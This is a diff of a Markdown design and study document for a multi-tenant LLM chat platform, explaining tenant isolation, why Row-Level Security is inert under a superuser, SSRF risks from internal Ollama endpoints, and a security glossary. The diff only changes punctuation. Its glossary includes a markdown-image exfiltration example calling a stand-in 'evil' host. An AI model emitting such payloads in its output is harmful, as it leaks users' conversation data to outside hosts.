@@ -128,11 +128,11 @@ proves *that specific mechanism* fired rather than merely that something threw.
 
 ### Three layers of isolation, and why the third is missing
 
-1. **Composite FKs** — a guarantee, enforced by the database.
-2. **`forTenant()`** in `src/db/tenant-db.ts` — a repository whose methods pre-apply the tenant
+1. **Composite FKs** - a guarantee, enforced by the database.
+2. **`forTenant()`** in `src/db/tenant-db.ts` - a repository whose methods pre-apply the tenant
    predicate. The raw handle is deliberately named `dbRoot`, so an unscoped query looks wrong in
    a diff. This is ergonomics, not a guarantee.
-3. **Row-Level Security** — deliberately *not* implemented, and the reason is the lesson:
+3. **Row-Level Security** - deliberately *not* implemented, and the reason is the lesson:
 
    ```sql
    select usesuper from pg_user where usename = 'michi';  -- t
@@ -141,7 +141,7 @@ proves *that specific mechanism* fired rather than merely that something threw.
    Superusers bypass RLS unconditionally. `FORCE ROW LEVEL SECURITY` does not help. Policies
    written today would be **silently inert**, which is the most common way people ship "RLS" with
    zero protection. Doing it properly needs `CREATE ROLE michi_app NOSUPERUSER NOBYPASSRLS`, and
-   every scoped query inside a transaction calling `set_config('app.tenant_id', …, true)` —
+   every scoped query inside a transaction calling `set_config('app.tenant_id', …, true)`  - 
    because `postgres.js` pools connections, so a bare `SET` leaks to whichever request grabs that
    connection next, and `SET LOCAL` outside a transaction is a silent no-op.
 
@@ -159,7 +159,7 @@ Both decisions were written into `src/db/schema.ts` as a comment months before t
 existed, because both are expensive to reverse:
 
 - **`tenant_id` goes directly on `kb_chunks`**, not reached through `kb_documents`. Retrieval is
-  `where tenant_id = $1 order by embedding <=> $2 limit k` — a leaf scan with no join to hang the
+  `where tenant_id = $1 order by embedding <=> $2 limit k` - a leaf scan with no join to hang the
   filter on.
 - **No ANN index at first.** pgvector's HNSW/IVFFlat **post-filter**: the index picks
   `ef_search` nearest rows *globally*, then applies `tenant_id`. A small tenant can get back
@@ -229,7 +229,7 @@ recoverable failure lives**, because a `ReadableStream` response has already sen
 ### The client side
 
 `src/components/ChatPanel.tsx` uses `fetch` + `response.body.getReader()`, **not** `EventSource`
-— EventSource cannot POST. So the SSE frame parser is hand-rolled: accumulate into a buffer,
+ -  EventSource cannot POST. So the SSE frame parser is hand-rolled: accumulate into a buffer,
 split on `\n\n`, parse `event:` / `data:` lines. Roughly 30 lines that every streaming-chat
 tutorial hides from you.
 
@@ -245,10 +245,10 @@ route handlers get none.
 The footgun worth internalising:
 
 ```tsx
-// admin/layout.tsx — UX only. Does NOT protect actions.
+// admin/layout.tsx - UX only. Does NOT protect actions.
 if (!(await isAuthenticated())) redirect("/admin/login");
 
-// actions.ts — the real guard, first line of EVERY mutation.
+// actions.ts - the real guard, first line of EVERY mutation.
 export async function saveTenantAction(...) {
   await requireAdmin();
 ```
@@ -259,7 +259,7 @@ fires too late to stop the write.
 ### Why there is no `middleware.ts`
 
 Not a style choice. Middleware runs on the **Edge runtime**, where the `postgres` driver (raw TCP
-sockets) and `node:crypto` are both unavailable — so neither tenant resolution nor session
+sockets) and `node:crypto` are both unavailable - so neither tenant resolution nor session
 verification can live there. Static admin security headers go in `next.config.ts` instead.
 
 ### The tool packs
@@ -267,7 +267,7 @@ verification can live there. Static admin security headers go in `next.config.ts
 A tenant enables a code-defined pack and fills in parameters; the platform owns scheme, host and
 port. Tenants never supply a raw URL. Two independent reasons:
 
-- **SSRF.** From inside the app container, `http://<wsl-host>:11434/api/tags` returns 200 —
+- **SSRF.** From inside the app container, `http://<wsl-host>:11434/api/tags` returns 200  - 
   unauthenticated Ollama, whose API includes `pull` (fill the disk), `delete` (destroy the model
   the platform runs on) and `generate` (free inference bypassing every quota). Also reachable:
   `db:5432`, `litellm:4000`, and the app itself. Doing arbitrary URLs safely means resolving DNS
@@ -316,36 +316,36 @@ Skim only: `admin/*/page.tsx` (plain server components), `globals.css`, `admin.c
 Grouped by where they bite. You will know most; the value is in the specific gotcha attached.
 
 **Multi-tenancy**
-- *composite foreign key* / *denormalized tenant key* — the guarantee in this schema
-- *Row-Level Security*, `BYPASSRLS`, `FORCE ROW LEVEL SECURITY`, `set_config(…, true)` — and
+- *composite foreign key* / *denormalized tenant key* - the guarantee in this schema
+- *Row-Level Security*, `BYPASSRLS`, `FORCE ROW LEVEL SECURITY`, `set_config(…, true)` - and
   why a superuser makes all of it inert
 - *noisy neighbour*, *per-tenant quota*, *fixed window vs token bucket*
 
 **Web security**
-- *SSRF*, **DNS rebinding**, *TOCTOU*, undici `Agent` with a custom `lookup` — why hostname
+- *SSRF*, **DNS rebinding**, *TOCTOU*, undici `Agent` with a custom `lookup` - why hostname
   allowlists alone do not work
 - *CORS preflight*, `Vary: Origin`, why `Access-Control-Allow-Origin: *` and
   `credentials: 'include'` are mutually exclusive, *open reflector*
-- `SameSite=None; Secure`, *CHIPS* / partitioned cookies, *third-party cookie deprecation* — why
+- `SameSite=None; Secure`, *CHIPS* / partitioned cookies, *third-party cookie deprecation* - why
   this app uses a bearer token in partitioned `localStorage` instead
 - *CSRF*, *double-submit token*, Server Actions' built-in Origin check
-- *zero-click exfiltration via markdown images* — `skipHtml` does not stop `![](https://evil/?c=…)`
+- *zero-click exfiltration via markdown images* - `skipHtml` does not stop `![](https://evil/?c=…)`
 - `scrypt` vs `bcrypt` vs `argon2`, `timingSafeEqual`, why you hash both sides first
 
 **LLM engineering**
 - *tool calling* / *function calling*, the `role: "tool"` message, `tool_call_id`
 - *prompt injection*, **indirect prompt injection** (via tool results), *delimiter escaping*,
   *instruction hierarchy*
-- *context window* vs *token budget* — and why tool results are re-sent every round
+- *context window* vs *token budget* - and why tool results are re-sent every round
 - *SSE*, why `EventSource` cannot POST, `X-Accel-Buffering: no`
 - *LLM gateway* (LiteLLM), *virtual keys*, *model aliasing*
 
 **RAG, now built**
-- *heading-aware chunking*, *embedding dimensions*, *cosine distance* (`<=>`) — and operator
+- *heading-aware chunking*, *embedding dimensions*, *cosine distance* (`<=>`) - and operator
   precedence: `${expr}::float8` in a SQL template casts the *parameter*, not the result
 - *HNSW*, *IVFFlat*, `ef_search`, **post-filtering vs pre-filtering**, `hnsw.iterative_scan`
 - *recall@k*, *golden set*, *LLM-as-judge* (and why the judge is a different model)
-- `encoding_format` and `drop_params` — the embedding-quirk story in section 1
+- `encoding_format` and `drop_params` - the embedding-quirk story in section 1
 
 **Postgres and Drizzle**
 - `drizzle-kit generate` vs `push`, `__drizzle_migrations`, *baselining*
